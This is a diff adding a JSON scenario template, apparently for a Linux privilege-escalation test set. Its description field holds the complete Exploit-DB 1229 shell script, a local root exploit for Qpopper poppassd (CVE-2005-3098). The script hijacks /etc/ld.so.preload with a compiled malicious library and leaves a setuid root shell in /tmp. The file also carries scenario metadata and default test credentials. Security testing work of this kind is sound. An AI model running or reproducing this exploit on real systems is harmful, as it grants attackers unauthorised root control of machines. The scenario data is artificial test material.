@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_1229",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Qpopper 4.0.8 (Linux) - 'poppassd' Local Privilege Escalation (OSVDB-19683;CVE-2005-3098)\n\nExploit source code (1229.sh):\n```\n#!/bin/sh\n# tested and working /str0ke\n###########################################################################\n# Linux Qpopper poppassd latest version local r00t exploit by kcope     ###\n# August 2005                                                           ###\n# Confidential - Keep Private!                                          ###\n###########################################################################\n\nPOPPASSD_PATH=/usr/local/bin/poppassd\n\necho \"\"\necho \"Linux Qpopper poppassd latest version local r00t exploit by kcope\"\necho \"\"\nsleep 2\numask 0000\nif [ -f /etc/ld.so.preload ]; then\necho \"OOPS /etc/ld.so.preload already exists.. exploit failed!\"\nexit\nfi\ncat > program.c << _EOF\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init()\n{\n if (!geteuid()) {\n setgid(0);\n setuid(0);\n remove(\"/etc/ld.so.preload\");\n execl(\"/bin/sh\",\"sh\",\"-c\",\"chown root:root /tmp/suid; chmod +s /tmp/suid\",NULL);\n }\n}\n\n_EOF\ngcc -o program.o -c program.c -fPIC\ngcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles\ncat > suid.c << _EOF\nint main(void) {\n       setgid(0); setuid(0);\n       unlink(\"/tmp/suid\");\n       execl(\"/bin/sh\",\"sh\",0); }\n_EOF\n\ngcc -o /tmp/suid suid.c\ncp libno_ex.so.1.0 /tmp/libno_ex.so.1.0\necho \"--- Now type ENTER ---\"\necho \"\"\n$POPPASSD_PATH -t /etc/ld.so.preload\necho /tmp/libno_ex.so.1.0 > /etc/ld.so.preload\nsu\nif [ -f /tmp/suid ]; then\necho \"IT'S A ROOTSHELL!!!\"\n/tmp/suid\nelse\necho \"Sorry, exploit failed.\"\nfi\n\n# milw0rm.com [2005-09-24]\n```",
+  "cve": "OSVDB-19683;CVE-2005-3098",
+  "exploitdb_id": "1229",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_1229",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
